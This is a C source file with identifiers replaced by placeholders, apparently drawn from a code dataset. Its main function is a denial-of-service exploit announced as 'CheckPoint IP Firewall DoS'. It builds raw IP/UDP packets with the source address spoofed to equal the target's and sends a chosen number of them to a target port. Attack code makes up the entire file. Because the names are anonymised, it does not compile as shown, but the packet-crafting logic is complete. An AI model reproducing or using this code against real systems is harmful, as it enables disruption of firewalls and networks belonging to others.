
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_10__ TYPE_5__ ;
typedef struct TYPE_9__ TYPE_4__ ;
typedef struct TYPE_8__ TYPE_3__ ;
typedef struct TYPE_7__ TYPE_2__ ;
typedef struct TYPE_6__ TYPE_1__ ;


struct TYPE_9__ {int dest; int check; void* len; void* source; } ;
typedef TYPE_4__ udph_t ;
typedef int u_short ;
typedef int u_long ;
typedef char u_char ;
struct TYPE_8__ {scalar_t__ s_addr; } ;
struct sockaddr_in {TYPE_3__ sin_addr; int sin_family; void* sin_port; } ;
struct sockaddr {int dummy; } ;
typedef scalar_t__ sock_t ;
typedef int port_t ;
struct TYPE_7__ {scalar_t__ s_addr; } ;
struct TYPE_6__ {scalar_t__ s_addr; } ;
struct TYPE_10__ {int ip_hl; int ip_v; int ip_len; int ip_id; int ip_ttl; TYPE_2__ ip_dst; TYPE_1__ ip_src; scalar_t__ ip_sum; int ip_p; scalar_t__ ip_off; scalar_t__ ip_tos; } ;
typedef TYPE_5__ iph_t ;
typedef scalar_t__ ip_t ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int *,int) ;
 int FUNC_2 (scalar_t__) ;
 int VAR_13 ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int ,char*,...) ;
 void* FUNC_5 (int) ;
 scalar_t__ FUNC_6 (char*) ;
 int FUNC_7 (char*,int ,int) ;
 int FUNC_8 () ;
 scalar_t__ FUNC_9 (scalar_t__,char*,int,int ,struct sockaddr*,int) ;
 scalar_t__ FUNC_10 (scalar_t__,int ,int ,char**,int) ;
 scalar_t__ FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (unsigned int) ;
 int VAR_14 ;
 char* FUNC_13 (int ) ;
 scalar_t__ FUNC_14 (int *) ;
 int FUNC_15 (char*) ;

int FUNC_16 (int VAR_15, char * * VAR_16)
{
  ip_t VAR_17;
  sock_t VAR_18;
  iph_t * VAR_19;
  udph_t * VAR_20;
  u_char VAR_21[VAR_9];
  u_char * VAR_22 = "1";
  struct sockaddr_in VAR_23;
  port_t VAR_24;
  u_long VAR_25;

  if (VAR_15 < 3)
  {
    FUNC_15 (VAR_16[0]);
  }

  FUNC_4(VAR_14, "\n*** CheckPoint IP Firewall DoS\n");
  FUNC_4(VAR_14, "*** Bug discovered by: antipent <rtodd@antipentium.com>\n");
  FUNC_4(VAR_14, "*** Code by: lore <fiddler@antisocial.com>\n\n");

  if ((VAR_17 = FUNC_6(VAR_16[1])) == VAR_1)
  {
    FUNC_4(VAR_14, "Bad IP address '%s'\n", VAR_16[1]);
    FUNC_3(VAR_2);
  }

  else if (!(VAR_25 = FUNC_0(VAR_16[2])))
  {
    FUNC_4(VAR_14, "You should send at least 1 packet\n");
    FUNC_3(VAR_2);
  }

  else if ((VAR_18 = FUNC_11(VAR_0, VAR_10, VAR_5)) == VAR_1)
  {
    FUNC_4(VAR_14, "Couldn't create raw socket: %s\n", FUNC_13(VAR_13));
    FUNC_3(VAR_2);
  }

  else if ((FUNC_10(VAR_18, VAR_4, VAR_7, &VAR_22, 1)) == VAR_1)
  {
    FUNC_4(VAR_14, "Couldn't set socket options: %s\n", FUNC_13(VAR_13));
    FUNC_3(VAR_2);
  }

  FUNC_12((unsigned)FUNC_14(((void*)0)));

  if (VAR_15 > 3)
  {
    VAR_24 = FUNC_5(FUNC_0(VAR_16[3]));
  }
  else
  {
    VAR_24 = FUNC_5(FUNC_8() % 65535 + 1);
  }

  FUNC_4(VAR_14, "Sending packets: ");

  while (VAR_25--)
  {

    FUNC_7(VAR_21, 0, VAR_9);

    VAR_19 = (iph_t *)(VAR_21 + VAR_8);
    VAR_20 = (udph_t *)(VAR_21 + VAR_11);

    VAR_19->ip_hl = 5;
    VAR_19->ip_v = 4;
    VAR_19->ip_tos = 0;
    VAR_19->ip_len = VAR_9;
    VAR_19->ip_id = 1234;
    VAR_19->ip_off = 0;
    VAR_19->ip_ttl = 255;
    VAR_19->ip_p = VAR_6;
    VAR_19->ip_sum = 0;
    VAR_19->ip_src.s_addr = VAR_17;
    VAR_19->ip_dst.s_addr = VAR_17;

    VAR_20->source = FUNC_5(FUNC_8() % 65535 + 1);
    VAR_20->dest = VAR_24;
    VAR_20->len = FUNC_5(VAR_12);
    VAR_20->check = FUNC_1((u_short *)VAR_19, VAR_9);

    VAR_23.sin_port = FUNC_5(VAR_24);
    VAR_23.sin_family = VAR_0;
    VAR_23.sin_addr.s_addr = VAR_17;

    if ((FUNC_9(VAR_18,
                VAR_21,
                VAR_9,
                0,
                (struct sockaddr *)&VAR_23,
                sizeof(struct sockaddr_in))) == VAR_1)
    {
      FUNC_4(VAR_14, "Couldn't send packet: %s\n",
        FUNC_13(VAR_13));
      FUNC_2(VAR_18);
      FUNC_3(VAR_2);
    }
    FUNC_4(VAR_14, ".");

  }

  FUNC_4(VAR_14, "\n");
  FUNC_2(VAR_18);

  return (VAR_3);
}
